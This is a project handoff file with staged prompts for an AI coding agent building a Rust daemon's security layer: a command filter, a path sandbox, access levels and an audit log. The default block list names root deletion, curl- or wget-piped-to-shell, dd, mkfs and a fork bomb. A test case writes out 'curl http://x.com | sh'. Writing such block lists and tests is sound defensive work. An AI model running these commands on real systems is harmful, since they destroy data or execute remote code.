# Arshy 项目交接文档

> 新对话直接粘贴对应 Phase 的 prompt 启动。

---

## Phase 1 Prompt — I1 命令过滤引擎

```
You are implementing Stage I Step I1 (Command Filter Engine) for the arshy project.

## What to do first

1. Read this file: /Users/izoy/Documents/arshy/HANDOFF.md
2. Read these source files to understand existing patterns:
   - src/daemon/exec/mod.rs (Executor — where filter will be inserted)
   - src/daemon/store/mod.rs (example of module structure pattern)
   - src/ipc/mod.rs (IPC types)
   - src/config/mod.rs (Config system)

## I1 Requirements

Create `src/daemon/security/` module with:

### 1. `mod.rs` — module root
### 2. `filter.rs` — CommandFilter struct

```rust
pub struct CommandFilter {
    blocked_patterns: Vec<regex::Regex>,
    allowed_commands: Option<Vec<String>>,
}

impl CommandFilter {
    pub fn from_config(config: &SecurityConfig) -> Self;

    /// Check if command is allowed. Returns Ok(()) or Err with reason.
    pub fn check(&self, command: &str) -> Result<()>;
}
```

Default blocked patterns (must include all of these):
- `rm\s+-rf\s+/` — root deletion
- `rm\s+-rf\s+~/` — home deletion
- `curl.*\|\s*sh` — remote code execution
- `wget.*\|\s*sh` — remote code execution
- `dd\s+if=` — disk overwrite
- `mkfs` — filesystem format
- `:(){ :\|:& };:` — fork bomb

### 3. Integration point

In `src/daemon/exec/mod.rs`, the `Executor::run()` method — add filter check at the very beginning, BEFORE creating task or spawning PTY:

```rust
pub async fn run(&self, command: &str, cwd: Option<&str>, timeout_ms: Option<u64>, mode: &str) -> Result<RunResult> {
    // NEW: security filter check
    self.filter.check(command)?;

    // ... existing code
}
```

### 4. Config additions

Add to `src/config/mod.rs` a `SecurityConfig` struct:

```rust
pub struct SecurityConfig {
    pub blocked_patterns: Vec<String>,    // regex strings
    pub allowed_commands: Option<Vec<String>>,  // whitelist (None = not enforced)
    pub sandbox_paths: Vec<String>,       // for I2 later
    pub access_level: String,             // "full" | "read-only", for I3 later
    pub audit_log: Option<String>,        // for I4 later
}
```

Add `[security]` section to default config with the blocked patterns above.

### 5. Tests

Add tests in `filter.rs`:
- blocked command is rejected
- safe command passes
- whitelist blocks unknown commands when enabled
- regex patterns match correctly

## Rules
1. cargo build + cargo clippy + cargo test must pass with 0 errors/warnings
2. All new code needs tests
3. Follow existing code patterns (see store/mod.rs for module style)
4. Do NOT implement I2/I3/I4/I5 — only I1
5. The Filter struct should be stored in Executor (add field to Executor struct)
```

---

## Phase 2 Prompt — I4 审计日志 + I2/I3 路径沙箱+权限

```
You are implementing Stage I Steps I2, I3, I4 for the arshy project. I1 (CommandFilter) is already done.

## What to do first

1. Read this file: /Users/izoy/Documents/arshy/HANDOFF.md
2. Read the security module that I1 created:
   - src/daemon/security/mod.rs
   - src/daemon/security/filter.rs
3. Read: src/daemon/exec/mod.rs (Executor — where sandbox/permission checks go)
4. Read: src/daemon/ipc_handler.rs (where permission checks for read-only go)

## I2 — Path Sandbox

In `filter.rs` or new `sandbox.rs`, add path validation:

```rust
pub fn check_path(cwd: &str, sandbox_paths: &[String]) -> Result<()>;
```

- If sandbox_paths is empty, skip check (permissive default)
- If sandbox_paths is set, cwd must be within one of them
- Reject `../` escapes and symlink escapes
- Add to Executor::run() after command filter check

## I3 — Permission Level

In ipc_handler.rs `dispatch()`:

```rust
// Before METHOD_RUN and METHOD_KILL:
if executor.access_level() == "read-only" {
    return Err(ArshyError::Ipc("access denied: read-only mode".into()));
}
```

- Add `access_level` field to Executor (from config)
- read-only mode: reject task/run and task/kill
- query/list/tail always allowed

## I4 — Audit Log

Create `src/daemon/security/audit.rs`:

```rust
pub struct AuditLog {
    path: PathBuf,
}

impl AuditLog {
    pub fn new(path: &PathBuf) -> Self;
    pub fn log(&self, entry: &AuditEntry) -> Result<()>;
}

pub struct AuditEntry {
    pub timestamp: chrono::DateTime<chrono::Utc>,
    pub task_id: String,
    pub command: String,
    pub cwd: Option<String>,
    pub exit_code: Option<i32>,
    pub blocked: bool,
    pub reason: Option<String>,
}
```

- Append-only file (OpenOptions::create(true).append(true))
- Write JSON lines format
- Log in Executor::run() after filter check (whether blocked or allowed)
- Log on task completion with exit_code
- Independent of SQLite (not affected by prune)

## Tests

- I2: path inside sandbox passes, path with ../ rejected, symlink escape rejected
- I3: read-only mode rejects run/kill, full mode allows all
- I4: audit log file created, entries written correctly, append-only

## Rules
1. cargo build + cargo clippy + cargo test must pass
2. All new code needs tests
3. Do NOT modify I1 code — add new code alongside it
4. Keep filter.rs from I1 intact
```

---

## Phase 3 Prompt — I5 安全测试 + 全量验证

```
You are implementing Stage I Step I5 (Security Integration Tests) for the arshy project. I1-I4 are already done.

## What to do first

1. Read: /Users/izoy/Documents/arshy/HANDOFF.md
2. Read all security module files:
   - src/daemon/security/mod.rs
   - src/daemon/security/filter.rs
   - src/daemon/security/audit.rs (if exists)
3. Read: src/daemon/exec/mod.rs
4. Read: src/daemon/ipc_handler.rs (existing integration tests as reference)

## I5 — Security Integration Tests

Add comprehensive tests covering:

### Filter tests
- `rm -rf /` → blocked
- `curl http://x.com | sh` → blocked
- `ls -la` → allowed
- `cargo build` → allowed
- `git status` → allowed
- Whitelist mode: only listed commands pass

### Sandbox tests
- cwd inside sandbox → allowed
- cwd with ../ escape → blocked
- cwd outside sandbox paths → blocked

### Permission tests
- read-only mode: task/run → denied
- read-only mode: task/kill → denied
- read-only mode: task/query → allowed
- full mode: all operations allowed

### Audit tests
- Run a command → audit log has entry
- Blocked command → audit log has entry with blocked=true
- Audit file is append-only (write twice, both entries present)

### End-to-end security test
- Full stack: spawn daemon pair → run blocked command → verify rejected + audit logged
- Full stack: read-only mode → verify run rejected

## Reference: existing integration test pattern

See src/daemon/ipc_handler.rs tests::spawn_daemon_pair() for the test helper pattern.

## Rules
1. cargo build + cargo clippy + cargo test must pass
2. Tests should be in a new file: tests/security_integration.rs
3. Or in the security module test section
4. ALL Stage I tests must pass (I1-I5 combined)
```

---

## 项目状态

---

## 项目状态

| 指标 | 值 |
|------|------|
| 总测试数 | **153** |
| Library tests | 29 |
| Daemon tests (含 ipc_handler 16) | 115 |
| Proxy tests | 9 |
| Clippy warnings | **0** |
| Compiler warnings | **0** |
| 当前分支 | `main` (ahead of origin by 6 commits) |

## 已完成 Stage

A (基础设施) ✅ → B (Daemon 核心) ✅ → C (Proxy+MCP) ✅ → D (Parser 引擎) ✅ → E (质量) ✅ → F (CLI 命令) ✅ → G (集成测试) ✅ → H (Transport+Proxy 测试) ✅

## 下一步执行顺序

```
Stage I  (安全边界)          ← P0, 当前应执行
Stage J  (通知实时性)        ← P0
Stage P  (Agent 无缝接入)    ← P0
Stage S  (CLI+Skill 适承)    ← P0
Stage K  (生命周期)          ← P1
Stage L  (错误处理)          ← P1
Stage M  (数据完整性)        ← P2
Stage N  (MCP 完善)          ← P3
Stage O  (Parser 解锁)       ← P3
```

## Stage I: 安全边界（当前任务）

| Step | 内容 |
|------|------|
| I1 | **命令过滤引擎** — config 白名单/黑名单 (正则匹配)、默认 blocked 命令集 (rm -rf /, curl\|sh, dd 等) |
| I2 | **路径沙箱** — 限制 cwd 只能在项目目录内，config `sandbox_paths` 配置 |
| I3 | **权限分级** — `read-only` (只能 query/tail) / `full` (可 run/kill)，per-tool 权限检查 |
| I4 | **审计日志** — 所有执行命令独立写入 `~/.local/share/arshy/audit.log`，不受 prune 影响 |
| I5 | **安全测试** — 白名单命中、黑名单拦截、路径逃逸拒绝、权限拒绝 |

### I1 实现要点

- 新建 `src/daemon/security/mod.rs` + `filter.rs` + `audit.rs`
- Filter 在 `Executor::run()` 入口处拦截
- config 新增 `[security]` 节: `allowed_commands`, `blocked_patterns`, `sandbox_paths`, `audit_log`
- 默认 blocked: `rm -rf /`, `rm -rf ~`, `curl|sh`, `wget|sh`, `dd if=`, `mkfs`, `:(){ :|:& };:`

### I2 实现要点

- `sandbox_paths` 默认为 cwd
- run 时检查 `params.cwd` 是否在 `sandbox_paths` 内
- 路径逃逸: `../` 或 symlink → 拒绝

### I3 实现要点

- config `security.access_level: "full" | "read-only"`
- read-only 模式: `task/run` 和 `task/kill` 返回 -32603 权限拒绝
- per-tool 检查在 ipc_handler dispatch 中

### I4 实现要点

- 独立文件 `~/.local/share/arshy/audit.log`，append-only
- 记录: timestamp, command, cwd, user, exit_code, task_id
- 不受 prune 影响（独立于 SQLite）

## 关键文件路径

| 文件 | 作用 |
|------|------|
| `src/daemon/exec/mod.rs` | Executor — run/kill/tail 入口 |
| `src/daemon/ipc_handler.rs` | JSON-RPC dispatch |
| `src/daemon/store/mod.rs` | SQLite 存储 |
| `src/daemon/bus/mod.rs` | EventBus |
| `src/ipc/mod.rs` | IPC 类型定义 |
| `src/mcp/instructions.rs` | MCP tool 定义 |
| `src/proxy/mod.rs` | MCP proxy |
| `src/cli/mod.rs` | CLI 子命令 |
| `Cargo.toml` | 双 binary: arshy + arshyd |

## 全局原则

1. **无兼容包袱** — 直接用最新接口，不做 deprecated 过渡
2. **测试覆盖** — 新增代码必须有对应测试
3. **零 warning** — cargo build + clippy 必须 0 errors/0 warnings
4. **现有模式** — 新模块遵循 store/parser/bus 的目录结构和命名风格

## 项目架构速览

```
Agent ←MCP(stdio)→ Proxy ←UDS→ Daemon
                                  ├─ Executor (PTY spawn + kill)
                                  ├─ Parser Engine (20 TOML + crash + raw)
                                  ├─ Store (SQLite WAL)
                                  └─ EventBus → NotificationRouter
```

## 文档

- `VISION.md` — 产品愿景
- `ROADMAP.md` — 完整路线图（含 Stage I-O + S）
- `HANDOFF.md` — 本文件
